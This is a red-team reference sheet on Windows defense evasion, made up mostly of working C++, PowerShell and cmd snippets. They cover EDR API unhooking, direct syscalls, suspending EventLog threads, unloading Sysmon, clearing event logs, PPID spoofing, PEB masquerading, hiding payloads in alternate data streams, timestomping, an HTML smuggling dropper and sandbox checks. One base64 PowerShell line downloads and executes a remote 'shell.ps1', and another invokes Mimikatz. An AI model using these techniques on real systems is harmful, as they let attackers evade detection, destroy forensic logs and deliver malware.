# Defense Evasion Techniques

## Overview
Defense evasion encompasses techniques to avoid detection by antivirus, EDR, and security monitoring. This includes API unhooking, syscall execution, logging suppression, and obfuscation methods.

*Source: Based on ired.team red team notes*

---

## AV/EDR Bypass Techniques

### API Unhooking
EDRs hook Windows APIs to monitor malicious behavior. Unhooking restores original function bytes.

**Full DLL Unhooking (C++):**
```cpp
// Read fresh ntdll from disk
HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

// Map fresh copy to memory
HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
LPVOID freshNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);

// Get hooked ntdll base
HMODULE hookedNtdll = GetModuleHandleA("ntdll.dll");

// Copy .text section from fresh to hooked
PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)freshNtdll;
PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)freshNtdll + dosHeader->e_lfanew);
for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
    PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(ntHeaders) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
    if (!strcmp((char*)sectionHeader->Name, ".text")) {
        DWORD oldProtection;
        VirtualProtect((LPVOID)((DWORD_PTR)hookedNtdll + sectionHeader->VirtualAddress), sectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
        memcpy((LPVOID)((DWORD_PTR)hookedNtdll + sectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)freshNtdll + sectionHeader->VirtualAddress), sectionHeader->Misc.VirtualSize);
        VirtualProtect((LPVOID)((DWORD_PTR)hookedNtdll + sectionHeader->VirtualAddress), sectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
    }
}
```

**Detecting Hooks:**
```cpp
// Compare first bytes of function with known syscall stub
BYTE* pNtAllocateVirtualMemory = (BYTE*)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
if (pNtAllocateVirtualMemory[0] == 0xE9) { // JMP instruction = hooked
    printf("Function is hooked!\n");
}
```

### Direct Syscalls
Bypass API hooks by calling syscalls directly.

**Manual Syscall (x64 Assembly):**
```asm
; NtAllocateVirtualMemory syscall
NtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, 18h          ; Syscall number (varies by Windows version)
    syscall
    ret
NtAllocateVirtualMemory ENDP
```

**Retrieving Syscall Numbers at Runtime:**
```cpp
// Read syscall number from ntdll on disk
DWORD GetSyscallNumber(const char* functionName) {
    HMODULE ntdll = LoadLibraryA("C:\\Windows\\System32\\ntdll.dll");
    BYTE* func = (BYTE*)GetProcAddress(ntdll, functionName);
    // Syscall number is at offset 4 in the stub
    return *(DWORD*)(func + 4);
}
```

### Preventing DLL Injection
Block EDR DLLs from loading into your process.

```cpp
// Block non-Microsoft DLLs
PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY policy = { 0 };
policy.MicrosoftSignedOnly = 1;
SetProcessMitigationPolicy(ProcessSignaturePolicy, &policy, sizeof(policy));
```

---

## Logging Suppression

### Disable Windows Event Logging
Suspend EventLog service threads without stopping the service.

```cpp
// Enumerate threads in EventLog service
// Suspend each thread to stop logging
HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
THREADENTRY32 te;
te.dwSize = sizeof(te);
if (Thread32First(hSnapshot, &te)) {
    do {
        if (te.th32OwnerProcessID == eventLogPid) {
            HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
            SuspendThread(hThread);
        }
    } while (Thread32Next(hSnapshot, &te));
}
```

### Unload Sysmon Driver
Remove Sysmon monitoring.

```cmd
# Find Sysmon driver name
fltMC.exe

# Unload (requires admin)
fltMC.exe unload SysmonDrv
```

### Clear Event Logs
```powershell
# Clear all logs
wevtutil el | Foreach-Object {wevtutil cl "$_"}

# Clear specific log
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
```

---

## Process Masquerading

### PEB Manipulation
Modify Process Environment Block to disguise process.

```cpp
// Change ImagePathName in PEB
typedef struct _PEB_LDR_DATA {
    // ...
} PEB_LDR_DATA;

// Access PEB via NtQueryInformationProcess
PROCESS_BASIC_INFORMATION pbi;
NtQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
PEB* peb = pbi.PebBaseAddress;

// Modify command line and image path
UNICODE_STRING fakeCmd = RTL_CONSTANT_STRING(L"C:\\Windows\\System32\\svchost.exe -k netsvcs");
RtlCopyMemory(peb->ProcessParameters->CommandLine.Buffer, fakeCmd.Buffer, fakeCmd.Length);
```

### PPID Spoofing
Set fake parent process ID.

```cpp
SIZE_T size;
InitializeProcThreadAttributeList(NULL, 1, 0, &size);
LPPROC_THREAD_ATTRIBUTE_LIST attrList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
InitializeProcThreadAttributeList(attrList, 1, 0, &size);

HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, parentPid);
UpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

STARTUPINFOEXA si = { sizeof(si) };
si.lpAttributeList = attrList;
CreateProcessA(NULL, "cmd.exe", NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
```

---

## Obfuscation Techniques

### PowerShell Obfuscation
```powershell
# String concatenation
$a = 'Inv'; $b = 'oke-'; $c = 'Mimikatz'; IEX "$a$b$c"

# Base64 encoding
powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=

# Character substitution
$cmd = [char]73+[char]69+[char]88  # IEX

# Invoke-Obfuscation tool
Invoke-Obfuscation -ScriptPath script.ps1 -Command "Token\All\1"
```

### Command Line Obfuscation
```cmd
# Environment variable substitution
cmd /c "set x=whoami && call echo %%x%%"

# Caret insertion
w^h^o^a^m^i

# Variable expansion
set a=who && set b=ami && call %a%%b%
```

### Binary Packing
```bash
# UPX packing
upx --best malware.exe

# Custom packers
# - Amber (reflective PE packer)
# - pe_to_shellcode
# - Donut (shellcode generator)
```

---

## File System Evasion

### Alternate Data Streams (ADS)
Hide data in NTFS streams.

```cmd
# Hide payload
type payload.exe > legitimate.txt:hidden.exe

# Execute from ADS
wmic process call create "c:\path\legitimate.txt:hidden.exe"

# Using PowerShell
Get-Content payload.exe -Raw | Set-Content -Path legitimate.txt -Stream hidden
```

### Timestomping
Modify file timestamps.

```powershell
# PowerShell
(Get-Item malware.exe).CreationTime = "01/01/2020 12:00:00"
(Get-Item malware.exe).LastWriteTime = "01/01/2020 12:00:00"
(Get-Item malware.exe).LastAccessTime = "01/01/2020 12:00:00"

# Metasploit
meterpreter> timestomp malware.exe -c "01/01/2020 12:00:00"
```

### HTML Smuggling
Embed and extract payload via JavaScript.

```html
<script>
var base64 = "TVqQAAMAAAAEAAAA...";  // Base64 encoded exe
var binary = atob(base64);
var array = new Uint8Array(binary.length);
for (var i = 0; i < binary.length; i++) {
    array[i] = binary.charCodeAt(i);
}
var blob = new Blob([array], {type: 'application/octet-stream'});
var url = URL.createObjectURL(blob);
var a = document.createElement('a');
a.href = url;
a.download = 'update.exe';
a.click();
</script>
```

---

## Arbitrary Code Guard (ACG) Bypass

Prevent dynamic code generation restrictions.

```cpp
// Allocate RWX memory before enabling ACG
LPVOID shellcode = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(shellcode, payload, payloadSize);

// Enable ACG (blocks future RWX allocations)
PROCESS_MITIGATION_DYNAMIC_CODE_POLICY policy = { 0 };
policy.ProhibitDynamicCode = 1;
SetProcessMitigationPolicy(ProcessDynamicCodePolicy, &policy, sizeof(policy));
```

---

## Execution Guardrails

Add environmental checks to avoid sandbox execution.

```cpp
// Check for sandbox artifacts
if (GetModuleHandleA("sbiedll.dll")) return;  // Sandboxie
if (GetModuleHandleA("dbghelp.dll")) return;  // Debugger

// Check system resources
MEMORYSTATUSEX mem;
mem.dwLength = sizeof(mem);
GlobalMemoryStatusEx(&mem);
if (mem.ullTotalPhys < 2147483648) return;  // Less than 2GB RAM

// Check for VM
SYSTEM_INFO si;
GetSystemInfo(&si);
if (si.dwNumberOfProcessors < 2) return;  // Single CPU
```

---

## Tools Reference

| Tool | Purpose |
|------|---------|
| SysWhispers | Syscall stub generation |
| Donut | Shellcode generation |
| Invoke-Obfuscation | PowerShell obfuscation |
| AMSI.fail | AMSI bypass payloads |
| Scarecrow | EDR bypass framework |
| NimHollow | Process hollowing in Nim |
